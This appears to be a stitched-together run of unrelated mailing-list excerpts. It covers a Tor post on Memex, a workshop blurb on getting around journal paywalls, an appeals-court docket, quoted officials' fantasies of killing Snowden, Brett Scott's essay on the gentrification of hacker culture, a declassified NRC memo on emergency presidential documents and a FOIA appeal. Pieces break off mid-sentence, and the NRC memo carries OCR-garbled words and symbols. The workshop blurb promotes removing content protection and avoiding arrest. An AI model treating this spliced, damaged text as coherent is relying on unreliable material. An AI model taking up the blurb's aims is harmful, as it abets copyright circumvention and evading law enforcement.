or reinforcing public perceptions of what privacy is for, and also
by attracting the attention and focus of law enforcement and making
that the way that law enforcement first learns about Tor. So, fuck
them, they should get off our network, that's not what Tor is for and
they're hurting all of us. Now, that doesn't mean we should weaken Tor,
even if we don't want them on the network. That slope is too easy to
slip down, and we must not get into the business of dictating what
is acceptable behavior for Tor users (which would eventually lead to
designing technical mechanisms to enforce these choices).
I just went back to re-read the Forbes article, and in retrospect it
sure makes it look like all of these companies are working on tools that
relate to Tor hidden services. They aren't. The main focus for Memex is
on automatically parsing and collecting info from ads on e.g. craigslist,
and generally getting better at the 'big data' side of searching and
organizing this data. More generally, Memex is made up of a bunch of
different companies, each doing their thing. I guess this is another
casualty of the ambiguity of the phrases 'dark web' and 'deep web',
since journalists find them hot to talk about but nobody reliably knows
what they refer to.
If you want to follow along with the actual technical work we're doing,
I invite you to observe or participate in the periodic "SponsorR"
meetings that happen on IRC:

Jumping the Paywall: How to freely share research without being arrested.
This workshop will identify and address two safety-critical problems
permeating research
today: lack of total free access to scholarship, and the looming
threat of apprehension for
trying to facilitate said free access.
The workshop will hypothesize workable solutions to the stated problem
sets by presenting
actionable intelligence and exploring tactical modes of engagement in
the on-going copyfight
via the exploration of securing free access to scholarship (in the
form of academic e-journal
articles and e-books), and via developing avoidance strategies to
forego existent and
emergent threats of apprehension resulting from participation in the
practices of free access.
Topics covered will include:
--> Content access procurement
--> Operational security during field deployment
--> Watermark, metadata and content-protection identification and removal
--> Content distribution

CALLAHAN) A review of the record indicates that the notice of appeal

therefore discharged. To the extend appellant has moved to have the
panel recuse itself from consideration of this appeal, that request is
denied. To the extend appellant has moved for appt. of counsel in this
appeal. that request is denied because he is not entitled to appt of
counsel and this appeal does not present exceptional circumstances
warranting the appt of counsel. (see casefile for citations). No
motions for recon , clarification, modification of the denial of appt.
of counsel shall be filed or entertained. The court's records reflect
that this case may be appropriate for summary disposition because

with this order, this appeal will be automatically dismissed for
failure to prosecute. Briefing remains suspended pending further order

05/18/2005	  3 	Filed order ( Harry PREGERSON, William C. CANBY, ):
The ct, sua sponte, consolidates appl number 05-35289 and 05-35291. A
review of the record demonstrates that, although the 3/10/05 and
3/15/05 notices of appl were not filed within 60 days from entry of
the 1/7/05 judgment, aplts filed timely mtns for ext of time to appl
pursuant to FRAP 4(a)(5), which were contained in the notices of app.
The dc has not ruled on those motions. Accordingly, these appls are
remanded to the dc for the limited purpose of allowing that ct to rule
on aplts' mtns. The dc is requested to serve a copy of its decision on
this ct at its earliest convenience. Br in these appls is stayed
pending further order of this ct. [05-35289, 05-35291] (GR) [Entered:

07/21/2005	  11 	Order filed: A review of the record demonstrates that
this court lacks jurisdiction over appeal no. 05-35291 because the
3/15/05 notice of appeal was not filed within 60 days from entry of
the 1/7/05 judgment...CITE. Consequently, appeal no. 05-35291 is
DISMISSED for lack of jurisdiction. Although the district court also
denied aplt James Bell's motion for ext of time to appeal no.
05-35289, further review of the record reflects that aplt Bell's
appeal was timely filed pursuant to FRAP 4(c) because aplt Bell is
incarcerated and his 3/10/05 noa was recvd by the dc one day after the
deadline prescribed by FRAP 4(a)(1). Consequently, appeal no. 05-35289
shall proceed. A review of this court's docket in appeal no. 05-35289
reflects that the filing and docketing fees for this appeal remain
due. Within 21 days after the filing date of this order, aplt Bell
shall pay to the dc the $255.00 filing and docketing fees for this
appeal and file in this court proof of such payment or file in this
court a motion to proceed ifp. Failure to pay the fees or file a
motion to proceed ifp shall result in the automatic dismissal of the
appeal by the clerk for failure to prosecute. See 9th Cir.R. 42-1. (

References: i also recall amusingly the "Snowden Assasination" plots full of
absurd vengeance,
"In a world where I would not be restricted from killing an American,
I personally would go and kill him myself," a current NSA analyst told
BuzzFeed. "A lot of people share this sentiment."
A former U.S. Special Forces officer told Johnson that he "would love
to put a bullet in his head," adding the assertion that Snowden "is
single handedly the greatest traitor in American history."
Buzzfeed notes that nobody expects the U.S. government to act on such fantasies.
Nevertheless, the hypothetical assassination of the NSA-trained hacker
is quite detailed:
“I think if we had the chance, we would end it very quickly,” [an Army
intelligence officer] said. “Just casually walking on the streets of
Moscow, coming back from buying his groceries. Going back to his flat
and he is casually poked by a passerby. He thinks nothing of it at the
time starts to feel a little woozy and thinks it’s a parasite from the
local water. He goes home very innocently and next thing you know he
dies in the shower.”
 fortunately, Snowden continues unabated...

trappings of success. Or it was, until the gentrifiers moved in"
  - The hacker hacked
by Brett Scott
The hacker ethos is wild and anarchic, indifferent to the trappings of
success. Or it was, until the gentrifiers moved in
Any large and alienating infrastructure controlled by a technocratic
elite is bound to provoke. In particular, it will nettle those who
want to know how it works, those who like the thrill of transgressing,
and those who value the principle of open access. Take the US
telephone network of the 1960s: a vast array of physical
infrastructure dominated by a monopolistic telecoms corporation called
AT&T. A young Air Force serviceman named John Draper – aka Captain
Crunch – discovered that he could manipulate the rules of
tone-dialling systems by using children’s whistles found in Cap’n
Crunch cereal boxes. By whistling the correct tone into a telephone
handset, he could place free long-distance calls through a chink in
the AT&T armour.
Draper was one of the first phone phreakers, a motley crew of jokers
bent on exploring and exploiting loopholes in the system to gain free
access. Through the eyes of conventional society, such phreakers were
just juvenile pranksters and cheapskates. Yet their actions have since
been incorporated into the folklore of modern hacker culture. Draper
said in a 1995 interview: ‘I was mostly interested in the curiosity of
how the phone company worked. I had no real desire to go rip them off
and steal phone service.’
But in his book Hackers: Heroes of the Computer Revolution (1984), the
US journalist Steven Levy went so far as to put up Draper as an avatar
of the ‘true hacker’ spirit. Levy was trying to hone in on principles
that he believed constituted a ‘hacker ethic’. One such principle was
the ‘hands-on imperative’:
Hackers believe that essential lessons can be learned about the
systems – about the world – from taking things apart, seeing how they
work, and using this knowledge to create new and even more interesting
For all his protestations of innocence, it’s clear that Draper’s
curiosity was essentially subversive. It represented a threat to the
ordered lines of power within the system. The phreakers were trying to
open up information infrastructure, and in doing so they showed a
calculated disregard for the authorities that dominated it.
This spirit has carried through into the modern context of the
internet, which, after all, consists of computers connected to one
another via physical telecommunications infrastructure. The internet
promises open access to information and online assembly for individual
computer owners. At the same time, it serves as a tool for corporate
monopolists and government surveillance. The most widely recognised
examples of modern ‘hackers’ are therefore groups such as Anonymous
and WikiLeaks. These ‘cypherpunks’ and crypto-anarchists are internet
natives. They fight – at least in principle – to protect the privacy
of the individual while making power itself as transparent as

How yuppies hacked the original hacker ethos
Can we design the ideal city or must it evolve organically?
Why food should join books and music in the cultural canon
This dynamic is not unique to the internet. It plays out in many other
spheres of life. Consider the pranksters who mess with rail operators
by jamming ticket-barrier gates to keep them open for others. They
might not describe themselves as hackers, but they carry an ethic of
disdain towards systems that normally allow little agency on the part
of ordinary individuals. Such hacker-like subcultures do not
necessarily see themselves in political terms. Nevertheless, they
share a common tendency towards a rebellious creativity aimed at
increasing the agency of underdogs.
Unlike the open uprising of the liberation leader, the hacker impulse
expresses itself via a constellation of minor acts of insurrection,
often undertaken by individuals, creatively disguised to deprive
authorities of the opportunity to retaliate. Once you’re attuned to
this, you see hacks everywhere. I see it in capoeira. What is it? A
dance? A fight? It is a hack, one that emerged in colonial Brazil as a
way for slaves to practise a martial art under the guise of dance. As
an approach to rebellion, this echoes the acts of subtle disobedience
described by James Scott in Weapons of the Weak: Everyday forms of
Peasant Resistance (1986).
Hacking, then, looks like a practice with very deep roots – as
primally and originally human as disobedience itself. Which makes it
all the more disturbing that hacking itself appears to have been

Despite the hive-mind connotations of faceless groups such as
Anonymous, the archetype of ‘the hacker’ is essentially that of an
individual attempting to live an empowered and unalienated life. It is
outsider in spirit, seeking empowerment outside the terms set by the
mainstream establishment.
Perhaps it’s unwise to essentialise this figure. A range of quite
different people can think of themselves in those terms, from the
lonely nerd tinkering away on DIY radio in the garage to the
investigative journalist immersed in politicised muckraking. It seems
safe to say, though, that it’s not very hacker-like to aspire to
conventional empowerment, to get a job at a blue-chip company while
reading The Seven Habits of Highly Effective People. The hacker
impulse is critical. It defies, for example, corporate ambitions.
In my book The Heretic’s Guide to Global Finance (2013), I used this
figure of the hacker as a model for readers wishing to challenge the
global financial system. The machinery of global capital tends to be
seen as complex, disempowering and alienating. The traditional means
of contesting it is to build groups – such as Occupy Wall Street – to
influence politicians and media to pressure it on your behalf. But
this sets up a familiar dynamic: the earnest activist pitted against
the entrenched interests of the business elite. Each group defines
itself against the other, settling into a stagnant trench warfare. The
individual activists frequently end up demoralised, complaining within
echo-chambers about their inability to impact ‘the system’. They build
an identity based on a kind of downbeat martyrdom, keeping themselves
afloat through a fetishised solidarity with others in the same

Cyber-utopians believe the web spreads democratic freedom. In
practice, it can serve oppressors as much as the oppressed
I was attracted to the hacker archetype because, unlike the
straightforward activist who defines himself in direct opposition to
existing systems, hackers work obliquely. The hacker is ambiguous,
specialising in deviance from established boundaries, including
ideological battle lines. It’s a trickster spirit, subversive and hard
to pin down. And, arguably, rather than aiming towards some specific
reformist end, the hacker spirit is a ‘way of being’, an attitude
towards the world.
Take, for example, the urban explorer subculture, chronicled by
Bradley Garrett in Explore Everything: Placehacking the City (2013).
The search for unusual detours – through a sewer system, for example –
is exhilarating because you see things that you’re not supposed to be
interested in. Your curiosity takes you to places where you don’t
belong. It thus becomes an assertion of individual defiance of social
norms. The byproduct of such exploration is pragmatic knowledge, the
disruption of standard patterns of thought, and also dealienation –
you see what’s behind the interfaces that surround us, coming closer
to the reality of our social world.
    the hacker modifies the machine to make it self-destruct, or
programmes it to frustrate its owners, or opens its usage to those who
don’t own it
This is a useful sensibility to cultivate in the face of systems that
create psychological, political and economic barriers to access. In
the context of a complex system – computer, financial or underground
transit – the political divide is always between well-organised,
active insiders versus diffuse, passive outsiders. Hackers challenge
the binary by seeking access, either by literally ‘cracking’
boundaries – breaking in – or by redefining the lines between those
with permission and those without. We might call this appropriation.
A figure of economic power such as a factory owner builds a machine to
extend control. The activist Luddite might break it in rebellion. But
the hacker explores and then modifies the machine to make it
self-destruct, or programmes it to frustrate the purpose of it owners,
or opens its usage to those who do not own it. The hacker ethic is
therefore a composite. It is not merely exploratory curiosity or
rebellious deviance or creative innovation within incumbent systems.
It emerges from the intersection of all three.
The word ‘hacker’ came into its own in the age of information
technology (IT) and the personal computer. The subtitle of Levy’s
seminal book – Heroes of the Computer Revolution – immediately
situated hackers as the crusaders of computer geek culture. While some
hacker principles he described were broad – such as ‘mistrust
authority’ and ‘promote decentralisation’ – others were distinctly
IT-centric. ‘You can create art and beauty on a computer,’ read one.
‘All information should be free,’ declared another.
Ever since, most popular representations of the hacker way have
followed Levy’s lead. Neal Stephenson’s cyberpunk novel Snow Crash
(1992) featured the code-wielding Hiro as the ‘last of the freelance
hackers’. The film Hackers (1995) boasted a youthful crew of
jargon-rapping, keyboard-hammering computer ninjas. The media
stereotype that began to be constructed was of a precocious computer
genius using his technological mastery to control events or battle
others. It remains popular to this day. In the James Bond film Skyfall
(2012), the gadget-master Q is reinvented by the actor Ben Whishaw as
a young hacker with a laptop, controlling lines of code with almost
superhuman efficiency, as if his brain was wired directly into the
    In the hands of a sensationalist media, the ethos of hacking is
conflated with the act of cracking computer security
In a sense, then, computers were the making of the hacker, at least as
a popular cultural image. But they were also its undoing. If the
popular imagination hadn’t chained the hacker figure so forcefully to
IT, it’s hard to believe it ever would have been demonised in the way
it has been, or that it could have been so effectively defanged.
Computers, and especially the internet, are a primary means of
subsistence for many. This understandably increases public anxiety at
the bogeyman figure of the criminal ‘hacker’, the dastardly villain
who breaches computer security to steal and cause havoc. Never mind
that in ‘true’ hacker culture – as found in hackerspaces, maker-labs
and open-source communities around the world – the mechanical act of
breaking into a computer is just one manifestation of the drive to
explore beyond established boundaries. In the hands of a
sensationalist media, the ethos of hacking is conflated with the act
of cracking computer security. Anyone who does that, regardless of the
underlying ethos, is a ‘hacker’. Thus a single manifestation of a
single element of the original spirit gets passed off as the whole.
Through the lens of moral panic, a narrative emerges of hackers as a
class of computer attack-dogs. Their primary characteristics become
aggression and amorality. How to guard against them? How, indeed, to
round out the traditional good-versus-evil narrative? Well, naturally,
with a class of poacher-turned-gamekeepers. And so we find the
construction of ‘white-hat’ hackers, protective and upstanding
computer wizards for the public good.
Here is where the second form of corruption begins to emerge. The
construct of the ‘good hacker’ has paid off in unexpected ways,
because in our computerised world we have also seen the emergence of a
huge, aggressively competitive technology industry with a serious
innovation obsession. This is the realm of startups, venture
capitalists, and shiny corporate research and development departments.
And, it is here, in subcultures such as Silicon Valley, that we find a
rebel spirit succumbing to perhaps the only force that could destroy
it: gentrification.
Gentrification is the process by which nebulous threats are pacified
and alchemised into money. A raw form – a rough neighbourhood,
indigenous ritual or edgy behaviour such as parkour (or free running)
– gets stripped of its otherness and repackaged to suit mainstream
sensibilities. The process is repetitive. Desirable, unthreatening
elements of the source culture are isolated, formalised and
emphasised, while the unsettling elements are scrubbed away.
Key to any gentrification process are successive waves of pioneers who
gradually reduce the perceived risk of the form in question. In
property gentrification, this starts with the artists and disenchanted
dropouts from mainstream society who are drawn to marginalised areas.
Despite their countercultural impulses, they always carry with them
traces of the dominant culture, whether it be their skin colour or
their desire for good coffee. This, in turn, creates the seeds for
certain markets to take root. A WiFi coffeeshop appears next to the
Somalian community centre. And that, in turn, sends signals back into
the mainstream that the area is slightly less alien than it used to
If you repeat this cycle enough times, the perceived dangers that keep
the property developers and yuppies away gradually erode. Suddenly,
the tipping point arrives. Through a myriad of individual actions
under no one person’s control, the exotic other suddenly appears
within a safe frame: interesting, exciting and cool, but not
threatening. It becomes open to a carefree voyeurism, like a tiger
being transformed into a zoo animal, and then a picture, and then a
tiger-print dress to wear at cocktail parties. Something feels
‘gentrified’ when this shallow aesthetic of tiger takes over from the
authentic lived experience of tiger.
This is not just about property. In cosmetics shops on Oxford Street
in London you can find beauty products blazoned with pagan
earth-mother imagery. Why are symbols of earth-worship found within
the citadels of consumerism, printed on products designed to
neutralise and control bodily processes? They’ve been gentrified.
Pockets of actual paganism do still exist, but in the mainstream such
imagery has been thoroughly cleansed of any subversive context.
At the frontiers of gentrification are entire ways of being –
lifestyles, subcultures and outlooks that carry rebellious impulses.
Rap culture is a case in point: from its ghetto roots, it has crossed
over to become a safe ‘thing that white people like’. Gentrification
is an enabler of doublethink, a means by which people in positions of
relative power can, without contradiction, embrace practices that were
formed in resistance to the very things they themselves represent.
We are currently witnessing the gentrification of hacker culture. The
countercultural trickster has been pressed into the service of the
preppy tech entrepreneur class. It began innocently, no doubt. The
association of the hacker ethic with startups might have started with
an authentic counter-cultural impulse on the part of outsider nerds
tinkering away on websites. But, like all gentrification, the influx
into the scene of successive waves of ever less disaffected
individuals results in a growing emphasis on the unthreatening
elements of hacking over the subversive ones.
Silicon Valley has come to host, on the one hand, a large number of
highly educated tech-savvy people who loosely perceive themselves as
rebels set against existing modes of doing business. On the other
hand, it contains a very large pool of venture capital. The former
group jostle for the investor money by explicitly attempting to build
network monopolies – such as those created by Facebook and Google –
for the purpose of extracting windfall profit for the founders and for
the investors that back them, and perhaps, for the large corporates
who will buy them out.
    the revised definition of the tech startup entrepreneur as a
hacker forms part of an emergent system of Silicon Valley doublethink
In this economic context, curiosity, innovation and iterative
experimentation are ultimate virtues, and this element of the hacker
ethic has proved to be an appealing frame for people to portray their
actions within. Traits such as the drive for individual empowerment
and the appreciation of clever solutions already resemble the traits
of the entrepreneur. In this setting, the hacker attitude of playful
troublemaking can be cast in Schumpeterian terms: success-driven
innovators seeking to ‘disrupt’ old incumbents within a market in an
elite ‘rebellion’.
Thus the emergent tech industry’s definition of ‘hacking’ as
quirky-but-edgy innovation by optimistic entrepreneurs with a love of
getting things done. Nothing sinister about it: it’s just on-the-fly
problem-solving for profit. This gentrified pitch is not just a cool
personal narrative. It’s also a useful business construct, helping the
tech industry to distinguish itself from the aggressive squares of
Wall Street, competing for the same pool of new graduates.
Indeed, the revised definition of the tech startup entrepreneur as a
hacker forms part of an emergent system of Silicon Valley doublethink:
individual startups portray themselves as ‘underdogs’ while
simultaneously being aware of the enormous power and wealth the tech
industry they’re a part of wields at a collective level. And so we see
a gradual stripping away of the critical connotations of hacking. Who
said a hacker can’t be in a position of power? Google cloaks itself in
a quirky ‘hacker’ identity, with grown adults playing ping pong on
green AstroTurf in the cafeteria, presiding over the company’s
overarching agenda of network control.
This doublethink bleeds through into mainstream corporate culture,
with the growing institution of the corporate ‘hackathon’. We find
financial giants such as Barclays hosting startup accelerators and
financial technology hackathons at forums such as the FinTech
Innovation Lab in Canary Wharf in London, ostensibly to discover the
‘future of finance’… or at least the future of payment apps that they
can buy out. In this context, the hacker ethic is hollowed out and
subsumed into the ideology of solutionism, to use a term coined by the
Belarusian-born tech critic Evgeny Morozov. It describes the
tech-industry vision of the world as a series of problems waiting for
(profitable) solutions.
This process of gentrification becomes a war over language. If enough
newcomers with media clout use the hollowed-out version of the term,
its edge grows dull. You end up with a mere affectation, failing to
challenge otherwise conventional aspirations. And before you know it,
an earnest Stanford grad is handing me a business card that says,
without irony: ‘Founder. Investor. Hacker.’
Any gentrification process inevitably presents two options. Do you
abandon the form, leave it to the yuppies and head to the next wild
frontier? Or do you attempt to break the cycle, deface the
estate-agent signs, and picket outside the wine bar with placards
reading ‘Yuppies Go Home’?
The answer to this depends on how much you care. Immigrant
neighbourhoods definitely care enough to mobilise real resistance
movements to gentrification, but who wants to protect the hacker
ethic? For some, the spirit of hacking is stupid and pointless anyway,
an individualistic self-help impulse, not an authentic political
movement. What does it matter if it gets gentrified?
We need to confront an irony here. Gentrification is a pacification
process that takes the wild and puts it in frames. I believe that
hacking is the reverse of that, taking the ordered rules of systems
and making them fluid and wild again. Where gentrification tries to
erect safe fences around things, hacker impulses try to break them
down, or redefine them. These are two countervailing forces within
human society. The gentrification of hacking is… well, perhaps a
perfect hack.

Or maybe I’ve romanticised it. Maybe hacking has never existed in some
raw form to be gentrified. Perhaps it’s always been part of the
capitalist commodification processes. Stuff is pulled down and then
reordered. Maybe the hackers – like the disenchanted artists and
hipsters – are just the vanguard charged with identifying the next
profitable investment. Perhaps hacking has always been a contradictory
amalgam that combines desire for the unstable and queer with the
control impulse of the stable and straight. Certainly in mainstream
presentations of hacking – whether the criminal version or the Silicon
Valley version – there is a control fetish: the elite coder or
entrepreneur sitting at a dashboard manipulating the world, doing
mysterious or ‘awesome’ things out of reach of the ordinary person.
I’m going to stake a claim on the word though, and state that the true
hacker spirit does not reside at Google, guided by profit targets. The
hacker impulse should not just be about redesigning products, or
creating ‘solutions’. A hack stripped of anti-conventional intent is
not a hack at all. It’s just a piece of business innovation.
The un-gentrified spirit of hacking should be a commons accessible to
all. This spirit can be seen in the marginal cracks all around us.
It’s in the emergent forms of peer production and DIY culture, in
maker-spaces and urban farms. We see it in the expansion of ‘open’
scenes, from open hardware to open biotech, and in the intrigue around
3D printers as a way to extend open-source designs into the realm of
manufacture. In a world with increasingly large and unaccountable
economic institutions, we need these everyday forms of resistance.
Hacking, in my world, is a route to escaping the shackles of the
profit-fetish, not a route to profit.
Go home, yuppies.

as members of the news media under the federal public records law.
"There is nothing in the statute that specifies the number of outlets
a requester must have, and surely a newspaper is not disqualified if
it forsakes newsprint for (or never had anything but) a website,"
Garland wrote in an opinion joined by Judges Janice Rogers Brown and

Acting General Counsel
UPDATE OF PRESIDENTIAL EMERGENCY ACTION DOCUMENTS
This paper outlines the combined efforts of OGC and NSIR to review and make
recommendations for update of the Presidential Emergency Action
Documents (PEADs).
There are 48 PEADs, which are currently being reviewed and updated on
a government-wide
basis. The review and update process is being managed by the
Department of Justice
(DOJ), the Federal Emergency Management Agency (FEMA), and the National Security
Council (NSC).
The NRC's input to the PEAD review and update process is due to DOJ
and FEMA on July
30, 2004. This paper requests Commission approval to transmit the
attached inputs
(Attachment 2) to DOJ and FEMA on that date.
I. Background
The PEADs
The PEADs are pre-coordinated legal documents designed to implement Presidential
decisions during a national emergency. The PEADs consist of
proclamations, executive
orders, Presidential messages, and draft legislation ready for
submission to Congress.
Originally designed for use in the event of any major attack against
the United States that
disrupted the normal functions of the government, PEADs are used to implement
extraordinary Presidential authority in response to extraordinary situations.

SECRET DECLASSIFIED
The PEADs are useful tools in the case of an emergency because they
are flexible, may be
quickly executed, and are capable of rapid distribution and
implementation. PEADs reduce
the normal amount of time required to promulgate and implement such Presidential
documents by being prepared in advance of an emergency. They are
divided into seven
categories according to their subject matter, and designate
departments or agencies that
would have primary or support responsibility should the PEAD be executed.
Under the PEAD system, primary responsibility is designated to an
agency recommending
the execution of the PEAD, or one of the main agencies responsible for
its implementation.
Support responsibility is designated to an agency that has either been
assigned direct
involvement in carrying out one or more provisions of a PEAD, or an
agency that would be
directly impacted by the carrying out of a PEAD.
The PEAD Update and Revision Project
The current PEAD portfolio was created in 1989 and contains 48 PEAOs.
The first meeting
to discuss the PEAD update and revision project took place on April
22, 2004. The NRC was
not invited to this meeting, nor was the NRC specifically invited to
review the PEAD portfolio.
According to FEMA, the NRC was not asked to participate in the review
because the NRC is
not listed as a primary or support agency in any PEAD.
NSIR staff did not learn until June 2004 that the PEAD review was
underway. NSIR staff
subsequently contacted FEMA and requested copies of the PEADs and
guidance on how to
participate in the review process. NSIR staff did not receive this
information until late June.
The PEAD review and update process calls on all federal departments
and agencies to
review existing PEADs and develop any new PEADs within their
jurisdiction. FEMA serves
as the Executive Secretariat to facilitate the review and update
process, while DOJ
determines the legal sufficiency of any proposed changes or additions
to the PEADs. The
NSC provides overall policy direction for the effort, and will serve
as the final approval
authority for any recommended PEAD changes.
There were three main steps to the OGC/NSIR PEAD review and update
process. First,
OGC and NSIR jointly reviewed existing PEADs to determine their
potential impact on the
NRC, its licensees, and the energy sector in general. Second, NSIR
developed a list of
potential NRC security concerns during a national emergency that might
be addressed
through the PEAD mechanism, and researched whether those concerns are
currently being
addressed outside the PEAD framework. Finally, OGC researched the
legal basis for
existing PEADs, as well as recently enacted legislation, to determine
whether there is any
statutory basis to justify the proposal of a new or amended PEAD to
address NSIR's
concerns. On the basis of our review, OGC recommends one minor change to the
comments on an existing PEAD.

II. Analysis of Existing PEADs
As mentioned above, the PEADs are organized by seven broad categories:
Only category D contains PEADs that, if executed, might directly
impact the operations of
NRG-licensed facilities. These PEADs, D-201 and D-301, are discussed
in some detail
below. PEADs in cate ories A, F, and G mi ht indirect! affect NRC
licensees-for example,
PEADs in categories B
and are not likely to impact NRC operations or NRC-licensed activities
and are not
discussed here.
We turn now to a discussion of specific PEADs of greatest interest to the NRC.

Ill. Analysis of Recently Enacted Legislation and Consideration of New PEADs
As stated above, NSIR provided OGC with a list of potential areas of
NRC concern during a
national emergency that might be remedied by creation of a new PEAD
(Attachment 1 ). In
addition to analyzing existing PEADs to determine whether they could
be used to address
NSIR's concerns, OGC analyzed recently enacted legislation to
determine whether any new
Presidential emergency powers have been established that might be
incorporated into the
PEADs. Specifically, OGC examined the USA PATRIOT Act of 2001 and the Homeland
Security Act of 2002 to determine whether Congress has provided the
President with any
emergency powers that might support new PEADs germane to the NRC's
mission and/or
responsive to NSIR's concerns.
The Homeland Security Act, though sweeping in its reorganization of
federal agencies, did
not significantly expand the emergency powers of the President. Most,
if not all, Presidential
powers established by the Act relate to appointments, transfers and
designations of officials
responsible for executing the Act. The Act does establish some
substantive Presidential
authority-for example, the President is directed to prescribe
government-wide policies and
Â· procedures for sharing and protecting homeland security
information. But this authority is
apparently exercised through normal policymaking channels on a
continuing basis and would
not require a PEAD for emergency implementation.
The USA PATRIOT Act includes a wide range of provisions aimed at
improving investigative
tools in the fight against terrorism. These provisions largely apply
to the day-to-day functions
of law-enforcement agencies. The Act also expands the President's
authority to confiscate
property of foreign entities that engage in armed hostilities against
the United States.
Although seizure of property would disrupt terrorist organization over
time, it would not likely
address pressing social, economic, military, or political issues
during or after a national
emergency. Therefore, there appears to be no need for this
Presidential authority to be
implemented through the PEAD mechanism. It is also unclear how a PEAD
related to the
President's powers under the USA PATRIOT Act would relate to NRC's mission.
Ultimately, OGC discovered no new statutory authority that might be
used to support
development of new PEADs germane to NRC's mission or that would
address the areas of
concern identified by NSIR (Attachment 1).

SECRET DECLASSIFIED
ATTACHMENT 1
NSIR AREAS OF POTENTIAL CONCERN DURING NATIONAL EMERGENCIES
As part of the PEAD review and update process, NSIR staff posed a
number of scenarios
that might arise during a national emergency and asked whether any
PEADs should be
changed or added to address those scenarios. NSIR (in consultation
with other offices) also
considered whether existing authorities outside the PEAD framework
cold be used to address
its concerns. OGC then analyzed existing PEADs and recent legislation
to determine
whether any of NSIR's concerns should be addressed through PEAD
changes. Ultimately,
OGC recommends no substantive changes to the PEADs because NSIR's concerns can
either be addressed using existing PEADs, or are better addressed through other
decisionmaking processes.
NSIR Concerns Addressed by Existing PEADs
In the event of a national emergency, the President should not have to
wait for a state
governor to request assistance under the Stafford Act or to engage the National
Response Plan. Should a PEAD be developed that would allow the President to act
Under 42 U.S.C. Â§ 5191 (b), the President may engage the Stafford Act without a
request from a state governor by declaring that an emergency exists
for which the
primary responsibility for response rests with the United States because the
emergency involves a Â·subject area for which, under the Constitution
or laws of the
United States, the United States exercises exclusive or preeminent
responsibility and
authority. The National Response Plan would be used to implement the
Stafford Act
in these circumstances.
GC will recommend
make this explicit.
Situations may arise where security at critical nuclear facilities
needs to be supplemented
with armed forces. Should the President be able to direct the use of
National Guard units
or military reserves for this purpose using a PEAD?
Situations may arise where specific goods or services are needed to
respond to a nuclear
incident. For example, priority diagnosis and treatment for essential
nuclear power plant
personnel exposed to a range of chem-bio-rad hazards may be needed.

In the scenario posed by NSIR,
the Department of Health and Human Services, which has been delegated authority
to act under the DPA by Executive Order 12,919, would be em owered
Other NSIR Concerns for Which No PEAD Changes
are Needed
1. Situations may arise where a need for power requires continued
nuclear power plant
operation in violation of federal environmental laws or under degraded
safety conditions.
Would a PEAD authorizing such operation be useful? Â·
OGC does not recommend the development of a PEAD that could be used to order
operation of nuclear power plants under degraded safety conditions. Enforcement
discretion could be exercised by federal authorities (including the
NRC) to allow
continued operation even though not all safety and environmental
requirements are
being met. Specific decisions should be made by the agencies expert in
the relevant
field. PEADs are not used to make these detailed, technical judgments.
2. Terrorist attacks may cause radioactive material shipments to be
rerouted through states
that object. Is a PEAD necessary to resolve those objections?
The Department of Transportation currently has the authority to route
shipments over
a state's objection, so a PEAD is not needed. DOT regulations adopted under the
Hazardous Materials Transportation Act of 1975, as amended, would preempt state
efforts to block emergency rerouting of radioactive material shipments. See 49
U.S.C. Â§Â§ 5101-5127; 49 C.F.R. Â§ 397.101.
3. The NRC may need to take control of certain radioactive materials
because of increased
threats, weakened security, or other reasons that increase the risk to
the public. Is a
PEAD necessary for this purpose?
SECRET DECLASSIFIED
3
SECRET DECLASSIFIED
Under AEA sections 1OB and 186.c, the Commission has authority to order the
recapture of special nuclear material if a license is revoked or if
Congress declares a
national emergency.
The Commission also has broad authority under the AEA to take actions to protect
public health and safety and promote the common defense and security. This
authority can be invoked to ensure protection of material by mandating
measures or transfer of material to an authorized recipient. The NRC also has a
standing agreement with DOE to take radioactive materials when
necessary to protect
the public.
4. It may become critical and urgent that the NRC participate more
directly in assessing a
threat or in sharing threat information than is normally allowed.
Should a PEAD ordering
enhanced information sharing be written to meet the NRC's needs?
Information sharing and intelligence coordination continues to be a
high priority in the
daily operations of the federal government. In a national emergency, OGC expects
that those efforts would be further enhanced as observed in the response to the
attacks of September 11, 2001 .. Improvements to information and
intelligence sharing
should continue to be pursued through the Department of Homeland Security and
existing intelligence groups with which NRC has working contacts.
5. Nuclear power plant workers may refuse to work due to terrorist
threats against the plant
or a spreading outbreak of communicable disease or virus. Should a PEAD be
developed to address this possibility?
If a nuclear plant does not have enough willing workers to operate
safely, it would
have to be shut down. There is no legal authority that could be used
to force nuclear
power plant employees to work.

PROPOSED COMMENT LETTER TO DOJ
Dear Sir or Madam:
This letter provides the Nuclear Regulatory Commission's (NRC) input
to the Presidential
Emergency Action Documents (PEADs) update and review process. Although
the NRC was
not invited to participate in this review, the NRC learned of the

FEMA and requested the opportunity to comment. The NRC did not receive
the PEADs or
review guidance until late June.
The NRC recommends one minor change to the comments on an existing PEAD, offers
clarifying comments setting forth its understanding of another PEAD,
and sets forth its
expected role as a support agency in the event certain PEADs are executed.

to implement the NRP or the Stafford Act in every
situation. In typical scenarios, the President implements those
authorities by declaring a
"major disaster" in response to a state ovemor's re uest-this model
remains valid and
should continue to be followed
But extraordinary circumstances
may arise that require the President to engage the Stafford Act and
the NRP even before a
state requests federal assistance. In such circumstances, the
President may wish to
exercise his authority under 42 U.S.C. Â§ 5191(b) to declare an
"emergency" so that federal
resources are quickly brought to bear.

I reject and demand appeal of your rejection of this request.
First and foremost, please recognize that the GSF Explorer, formerly
USNS Hughes Glomar Explorer (T-AG-193), for which this Glomar response
is so named, was a purely military operation, using custom-built
military equipment, on an exceptionally sensitive military mission to
recover military equipment. Observe that the "Vulnerabilities Equities
Process" is a public outreach activity communicating with third party
partners, acting in the public interest regarding software used by
public citizens and business alike - a scenario at opposite ends and
means from which this denial blindly overreaches.
Second, observe that existing precedent supports the release of
materials responsive to this request. In American Civil Liberties
Union v. Department of Defense Case No: 04-CV-4151 (ACLU v. DoD) the
courts have affirmed the public interest as compelling argument for
favoring the public interest against clearly military efforts. The
Glomar denial should be well targeted; this targeted falls well
outside of the the "Vulnerabilities Equities Process", which is a
public outreach activity communicating with third party partners,
acting in the public interest, regarding software used by public
citizens and business alike.
Third, consider that it is a well established technique in the
information security industry to identify the origin and nature of a
defect discovery and disclosure timeline. This information is used for
myriad of secondary research, analysis, and automation efforts
spanning numerous industries. The utility of of disclosure timeline
information and context has decades of rich support and strong
evidence of public interest benefit, particularly regarding long
reported and fixed defects, such as this one, which has patches
available for over a year.
Fourth, observe that every hour of expert opinion coupled with legal
review amounts to a non-trivial expenditure of hours which are a sunk,
throw away cost of FOIA communication. While as a taxpayer I
